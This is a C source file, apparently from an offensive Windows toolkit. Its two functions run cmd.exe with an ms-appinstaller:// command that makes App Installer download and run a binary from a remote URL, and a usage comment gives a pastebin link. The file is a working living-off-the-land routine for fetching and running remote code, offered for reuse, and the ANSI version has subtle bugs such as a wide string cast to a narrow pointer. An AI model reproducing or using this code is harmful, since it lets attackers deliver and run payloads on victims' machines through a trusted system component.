#include "Win32Helper.h"

BOOL MpfLolExecuteRemoteBinaryByAppInstallerW(_In_ PWCHAR RemoteUrlTextFile, _In_ DWORD RemoteUrlLengthInBytes)
{
	//		Usage: MpfLolExecuteRemoteBinaryByAppInstallerW((PWCHAR)L"https://pastebin.com/raw/tdyShwLw", 34);
	//		NOTE: Will display an error stating MS-APPINSTALLER PROTOCOL IS DISABLED
	//		it must be enabled...

	PWCHAR Payload = NULL;
	DWORD dwPayloadLength = ERROR_SUCCESS;
	BOOL bFlag = FALSE;
	WCHAR CmdPath[MAX_PATH * sizeof(WCHAR)] = { 0 };

	dwPayloadLength = 36;
	dwPayloadLength += RemoteUrlLengthInBytes;

	if (!CreateWindowsObjectPathW(CmdPath, (PWCHAR)L"\\System32\\cmd.exe", MAX_PATH * sizeof(WCHAR), TRUE))
		goto EXIT_ROUTINE;

	Payload = (PWCHAR)HeapAlloc(GetProcessHeapFromTeb(), HEAP_ZERO_MEMORY, dwPayloadLength);
	if (Payload == NULL)
		goto EXIT_ROUTINE;

	if (StringCopyW(Payload, (PWCHAR)L"/c start ms-appinstaller://?source=") == NULL)
		goto EXIT_ROUTINE;

	if (StringConcatW(Payload, RemoteUrlTextFile) == NULL)
		goto EXIT_ROUTINE;

	bFlag = FastcallExecuteBinaryShellExecuteExW(CmdPath, Payload);
	
EXIT_ROUTINE:

	if (Payload)
		HeapFree(GetProcessHeapFromTeb(), HEAP_ZERO_MEMORY, Payload);

	return bFlag;
}

BOOL MpfLolExecuteRemoteBinaryByAppInstallerA(_In_ PCHAR RemoteUrlTextFile, _In_ DWORD RemoteUrlLengthInBytes)
{
	//		Usage: MpfLolExecuteRemoteBinaryByAppInstallerW((PWCHAR)L"https://pastebin.com/raw/tdyShwLw", 34);
	//		NOTE: Will display an error stating MS-APPINSTALLER PROTOCOL IS DISABLED
	//		it must be enabled...

	PCHAR Payload = NULL;
	DWORD dwPayloadLength = ERROR_SUCCESS;
	BOOL bFlag = FALSE;
	CHAR CmdPath[MAX_PATH] = { 0 };

	dwPayloadLength = 36;
	dwPayloadLength += RemoteUrlLengthInBytes;

	if (!CreateWindowsObjectPathA(CmdPath, (PCHAR)L"\\System32\\cmd.exe", MAX_PATH, TRUE))
		goto EXIT_ROUTINE;

	Payload = (PCHAR)HeapAlloc(GetProcessHeapFromTeb(), HEAP_ZERO_MEMORY, dwPayloadLength);
	if (Payload == NULL)
		goto EXIT_ROUTINE;

	if (StringCopyA(Payload, (PCHAR)"/c start ms-appinstaller://?source=") == NULL)
		goto EXIT_ROUTINE;

	if (StringConcatA(Payload, RemoteUrlTextFile) == NULL)
		goto EXIT_ROUTINE;

	bFlag = FastcallExecuteBinaryShellExecuteExA((PCHAR)"C:\\Windows\\System32\\cmd.exe", Payload);

EXIT_ROUTINE:

	if (Payload)
		HeapFree(GetProcessHeapFromTeb(), HEAP_ZERO_MEMORY, Payload);

	return bFlag;
}